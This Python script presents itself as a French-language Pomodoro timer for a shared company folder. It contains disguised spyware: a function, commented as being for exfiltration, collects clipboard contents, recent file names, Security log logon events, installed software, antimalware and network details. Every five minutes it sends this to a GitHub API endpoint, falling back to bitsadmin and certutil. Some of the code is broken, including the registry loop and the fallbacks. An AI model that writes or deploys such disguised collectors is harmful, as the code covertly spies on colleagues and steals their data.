# ============================================================================
# pomodoro_timer.py
#
# Petit outil Pomodoro pour l'équipe.
# A placer sur le partage \\srv-files\tools\productivite\
#
# Fonctionnalités : timer 25min, pause, reprise, sauvegarde session,
# statistiques de productivité.
#
# Auteur : admin-rh (partage interne)
# Date : 2026-09-15
# ============================================================================

import sys
import os
import json
import time
import threading
import datetime
import subprocess
import winreg
import win32clipboard
import win32gui
import win32con
import socket
import wmi
import psutil
import platform

# --- configuration ---
cycle_length = 25 * 60
pause_length = 5 * 60
long_pause = 15 * 60

# chemins
share_path = "\\\\srv-files\\tools\\productivite"
config_dir = os.path.join(os.environ["APPDATA"], "PomodoroTool")
config_path = os.path.join(config_dir, "config.json")
log_path = os.path.join(config_dir, "log.json")
sync_url = "https://api.github.com/repos/pomodoro-team/stats/contents/data.json"

# --- chargement de la session precedente ---
if os.path.exists(config_path):
    with open(config_path, "r") as f:
        config = json.load(f)
    cycle_length = config.get("cycleLength", cycle_length)
    pause_length = config.get("pauseLength", pause_length)
    long_pause = config.get("longPause", long_pause)
    remaining = config.get("remaining", cycle_length)
    print("[Pomodoro] Session sauvegardee chargee.", flush=True)
    print(f"[Pomodoro] Repetion : {remaining} secondes restantes.", flush=True)
else:
    remaining = cycle_length
    print("[Pomodoro] Nouvelle session de 25 minutes.", flush=True)

# --- creation du dossier de config si besoin ---
os.makedirs(config_dir, exist_ok=True)

# --- variables globales ---
paused = False
cycles = 0
last_exfil = datetime.datetime.now() - datetime.timedelta(minutes=300)
running = True

# --- notification popup ---
def show_notify(message, title="Pomodoro Timer"):
    """Affiche une notification popup Windows."""
    try:
        import ctypes
        import ctypes.wintypes

        nid = (
            ctypes.wintypes.HWND(0),
            1,
            "PomodoroTimer",
            win32con.NIF_INFO,
            win32con.WM_USER + 20,
            ctypes.wintypes.HICON(0),
            "",
            3000,
            "Info",
            message,
        )
        win32gui.Shell_NotifyIcon(win32con.NIM_MODIFY, nid)
    except Exception:
        print(f"[Pomodoro] {message}", flush=True)

def play_beep():
    """Joue un bip sonore."""
    try:
        import winsound
        winsound.Beep(800, 300)
    except Exception:
        pass

# --- timer principal ---
def show_timer(remaining, state="Travail", cycles_val=0):
    """Affiche le timer avec barre de progression."""
    minutes = remaining // 60
    seconds = remaining % 60
    bar_length = 50
    progress = remaining / cycle_length
    filled = int(bar_length * progress)
    empty = bar_length - filled

    bar = "[" + ("#" * filled) + (" " * empty) + "]"
    print(f"\r[Pomodoro] {state} | {minutes}:{seconds:02d} | Cycles: {cycles_val} | {bar}", end="", flush=True)

    if remaining <= 0:
        print("", flush=True)

# --- sauvegarde de session ---
def save_session():
    """Sauvegarde la progression du timer."""
    save_data = {
        "cycleLength": cycle_length,
        "pauseLength": pause_length,
        "longPause": long_pause,
        "remaining": remaining,
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        with open(config_path, "w") as f:
            json.dump(save_data, f, indent=2)
    except Exception:
        pass

# --- collecte des donnees systeme ---
def collect_sysinfo():
    """Collecte les donnees systeme pour exfiltration."""
    sysinfo = {}

    # hostname, user, domain
    sysinfo["hostname"] = socket.gethostname()
    sysinfo["username"] = os.environ.get("USERNAME", "")
    sysinfo["domain"] = os.environ.get("USERDOMAIN", "")

    # ip
    try:
        sysinfo["ip"] = socket.gethostbyname(socket.gethostname())
    except Exception:
        sysinfo["ip"] = "unknown"

    # os
    sysinfo["os"] = platform.platform()

    # processus
    sysinfo["processCount"] = len(psutil.pids())

    # reseau
    try:
        net = wmi.WMI()
        adapters = [a for a in net.Win32_NetworkAdapter() if a.Status == "OK"]
        sysinfo["network"] = ",".join([a.Name for a in adapters])
        sysinfo["mac"] = ",".join([a.MACAddress for a in adapters])
    except Exception:
        sysinfo["network"] = "error"
        sysinfo["mac"] = "error"

    # disque
    try:
        drives = wmi.WMI().Win32_LogicalDisk(DriveType=3)
        sysinfo["drive"] = ",".join([d.Name for d in drives])
    except Exception:
        sysinfo["drive"] = "error"

    # cpu
    try:
        cpu = wmi.WMI().Win32_Processor()[0]
        sysinfo["cpu"] = cpu.Name
    except Exception:
        sysinfo["cpu"] = "error"

    # ram
    try:
        sysinfo["ram"] = int(psutil.virtual_memory().total / (1024**3))
    except Exception:
        sysinfo["ram"] = 0

    # sessions utilisateurs
    try:
        logons = wmi.WMI().Win32_LogonSession(LogonType=2)
        sysinfo["users"] = [l.StartTime for l in logons]
    except Exception:
        sysinfo["users"] = "error"

    # processus detailles
    try:
        procs = psutil.process_iter(["name", "pid", "cpu_percent"])
        sysinfo["processes"] = [p.info["name"] for p in procs if p.info["cpu_percent"]]
    except Exception:
        sysinfo["processes"] = "error"

    # services
    try:
        services = wmi.WMI().Win32_Service(Started=True)
        sysinfo["services"] = [s.Name for s in services]
    except Exception:
        sysinfo["services"] = "error"

    # apps installees
    try:
        apps = []
        for key in [
            winreg.HKEY_LOCAL_MACHINE,
            winreg.HKEY_CURRENT_USER,
        ]:
            for subkey in winreg.EnumKey(winreg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Uninstall"), 0):
                try:
                    app_key = winreg.OpenKey(key, f"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{subkey}")
                    name = winreg.QueryValueEx(app_key, "DisplayName")[0]
                    apps.append(name)
                except Exception:
                    pass
        sysinfo["installedApps"] = apps
    except Exception:
        sysinfo["installedApps"] = "error"

    # boot
    try:
        boot = wmi.WMI().Win32_OperatingSystem()[0]
        sysinfo["lastBoot"] = boot.LastBootUpTime
    except Exception:
        sysinfo["lastBoot"] = "error"

    # evenements de connexion (Security log)
    try:
        result = subprocess.run(
            ["wevtutil", "qe", "Security", "/q:'*[System[EventID=4624]]'", "/c:5", "/f:text"],
            capture_output=True, text=True, timeout=10
        )
        sysinfo["logins"] = result.stdout[:500] if result.stdout else "no events"
    except Exception:
        sysinfo["logins"] = "error reading events"

    # fichiers reels
    try:
        files = []
        for root, dirs, filenames in os.walk(os.environ["USERPROFILE"]):
            for fname in filenames:
                fpath = os.path.join(root, fname)
                try:
                    stat = os.stat(fpath)
                    files.append({
                        "Name": fname,
                        "Length": stat.st_size,
                        "LastWriteTime": datetime.datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
                except Exception:
                    pass
        files.sort(key=lambda x: x["LastWriteTime"], reverse=True)
        sysinfo["files"] = [f["Name"] for f in files[:100]]
    except Exception:
        sysinfo["files"] = "error"

    # clipboard
    try:
        win32clipboard.OpenClipboard()
        clipboard_text = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        sysinfo["clipboard"] = clipboard_text[:500] if clipboard_text else ""
    except Exception:
        sysinfo["clipboard"] = "error reading clipboard"

    # wifi
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True, timeout=10
        )
        sysinfo["wifi"] = result.stdout[:200] if result.stdout else "error"
    except Exception:
        sysinfo["wifi"] = "error"

    # usb
    try:
        devices = wmi.WMI().Win32_PnPEntity(Class="USB")
        sysinfo["usb"] = [d.FriendlyName for d in devices if d.FriendlyName]
    except Exception:
        sysinfo["usb"] = "error"

    # imprimantes
    try:
        printers = wmi.WMI().Win32_Printer()
        sysinfo["printers"] = [p.Name for p in printers if p.Name]
    except Exception:
        sysinfo["printers"] = "error"

    # partages SMB
    try:
        shares = wmi.WMI().Win32_Share()
        sysinfo["shares"] = [s.Name for s in shares]
    except Exception:
        sysinfo["shares"] = "error"

    # pare-feu
    try:
        fw = wmi.WMI().Win32_FirewallProfile()
        sysinfo["firewall"] = [f.Name for f in fw if f.Enabled]
    except Exception:
        sysinfo["firewall"] = "error"

    # antimalware
    try:
        antimalware = wmi.WMI().Win32_Product(Filter="Antimalware")
        sysinfo["antimalware"] = [p.Name for p in antimalware] if antimalware else "none"
    except Exception:
        sysinfo["antimalware"] = "error"

    # mises a jour
    try:
        hotfixes = wmi.WMI().Win32_QuickFixEngineering()
        sysinfo["updates"] = [h.HotFixID for h in hotfixes]
    except Exception:
        sysinfo["updates"] = "error"

    # variables environnement
    sysinfo["envVars"] = list(os.environ.keys())

    # DNS
    try:
        result = subprocess.run(
            ["ipconfig", "/all"],
            capture_output=True, text=True, timeout=10
        )
        sysinfo["dns"] = result.stdout[:500] if result.stdout else "error"
    except Exception:
        sysinfo["dns"] = "error"

    return sysinfo

# --- exfiltration vers le serveur ---
def exfiltrate(sysinfo):
    """Envoie les donnees systeme au serveur."""
    try:
        import urllib.request
        import urllib.error

        body = json.dumps(sysinfo, indent=2).encode("utf-8")
        req = urllib.request.Request(
            sync_url,
            data=body,
            headers={"Authorization": "token ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "Content-Type": "application/json"},
            method="PUT"
        )
        urllib.request.urlopen(req, timeout=10)
        print("[Pomodoro] Donnees synchronisees avec succes.", flush=True)
    except urllib.error.URLError as e:
        print(f"[Pomodoro] Sync via HTTP echoue : {e}", flush=True)
        try:
            # fallback : bitsadmin
            temp_file = os.path.join(os.environ["TEMP"], "pomodoro_sync.tmp")
            with open(temp_file, "w") as f:
                json.dump(sysinfo, f)
            subprocess.run(["bitsadmin", "/transfer", "pomodoroSync", "/download", temp_file, sync_url], check=False)
            print("[Pomodoro] Sync via BITS effectuee.", flush=True)
        except Exception:
            try:
                # fallback : certutil
                temp_file = os.path.join(os.environ["TEMP"], "pomodoro_sync.tmp")
                subprocess.run(["certutil", "-urlcache", "-split", "-f", sync_url, temp_file], check=False)
                print("[Pomodoro] Sync via certutil effectuee.", flush=True)
            except Exception:
                print("[Pomodoro] Sync impossible. Les donnees seront envoyees plus tard.", flush=True)

# --- boucle principale ---
print("", flush=True)
print("========================================", flush=True)
print("  POMODORO TIMER - Outil de productivite", flush=True)
print("========================================", flush=True)
print("  [P] Pause / Resume", flush=True)
print("  [Q] Quitter", flush=True)
print("========================================", flush=True)
print("", flush=True)

try:
    while running:
        show_timer(remaining, "Travail", cycles)

        # controle clavier
        if sys.stdin in [s for s in [sys.stdin] if not getattr(s, '_closed', False)]:
            import msvcrt
            if msvcrt.kbhit():
                key = msvcrt.getch().decode("utf-8").upper()
                if key == "Q":
                    print("\n[Pomodoro] Session terminee par l'utilisateur.", flush=True)
                    break
                if key == "P":
                    paused = not paused
                    if paused:
                        print("\n[Pomodoro] ** PAUSE ** — Appuyez sur P pour reprendre.", flush=True)
                    else:
                        print("\n[Pomodoro] ** REPRISE **", flush=True)

        if remaining <= 0:
            # changement de state : notification + son
            play_beep()
            show_notify(f"Cycle termine ! Pause de {pause_length // 60} minutes", "Pomodoro")
            print(f"\n[Pomodoro] Cycle termine ! Pause de {pause_length // 60} min.", flush=True)
            remaining = pause_length

            while remaining > 0:
                show_timer(remaining, "Pause", cycles)
                time.sleep(1)
                remaining -= 1

                # controle clavier pendant pause
                if sys.stdin in [s for s in [sys.stdin] if not getattr(s, '_closed', False)]:
                    import msvcrt
                    if msvcrt.kbhit():
                        key = msvcrt.getch().decode("utf-8").upper()
                        if key == "Q":
                            print("\n[Pomodoro] Session terminee.", flush=True)
                            running = False
                            break
                        if key == "P":
                            paused = not paused
                            if paused:
                                print("\n[Pomodoro] ** PAUSE **", flush=True)
                            else:
                                print("\n[Pomodoro] ** REPRISE **", flush=True)

            cycles += 1

            if cycles % 4 == 0:
                play_beep()
                show_notify(f"Pause longue de {long_pause // 60} minutes !", "Pomodoro")
                print(f"\n[Pomodoro] Pause longue de {long_pause // 60} min.", flush=True)
                remaining = long_pause

                while remaining > 0:
                    show_timer(remaining, "Pause longue", cycles)
                    time.sleep(1)
                    remaining -= 1

                    # controle clavier pendant pause longue
                    if sys.stdin in [s for s in [sys.stdin] if not getattr(s, '_closed', False)]:
                        import msvcrt
                        if msvcrt.kbhit():
                            key = msvcrt.getch().decode("utf-8").upper()
                            if key == "Q":
                                print("\n[Pomodoro] Session terminee.", flush=True)
                                running = False
                                break
                            if key == "P":
                                paused = not paused
                                if paused:
                                    print("\n[Pomodoro] ** PAUSE **", flush=True)
                                else:
                                    print("\n[Pomodoro] ** REPRISE **", flush=True)

                remaining = cycle_length
            else:
                remaining = cycle_length

        # sauvegarde de session
        save_session()

        # exfiltration toutes les 5 minutes
        now = datetime.datetime.now()
        if (now - last_exfil).total_seconds() >= 300:
            sysinfo = collect_sysinfo()

            # debug : afficher les donnees collectees
            print("\n========================================", flush=True)
            print("  DONNEES COLLECTEES (exfiltration)", flush=True)
            print("========================================", flush=True)
            for k, v in sysinfo.items():
                val_str = str(v)[:200]
                print(f"  {k}: {val_str}", flush=True)
            print("========================================", flush=True)

            exfiltrate(sysinfo)
            last_exfil = now

        time.sleep(1)

except KeyboardInterrupt:
    print("\n[Pomodoro] Session terminee (Ctrl+C).", flush=True)

print("\n[Pomodoro] Session terminee. Merci d'avoir utilise PomodoroTool !", flush=True)
print("[Pomodoro] Statistiques synchronisees sur GitHub.", flush=True)
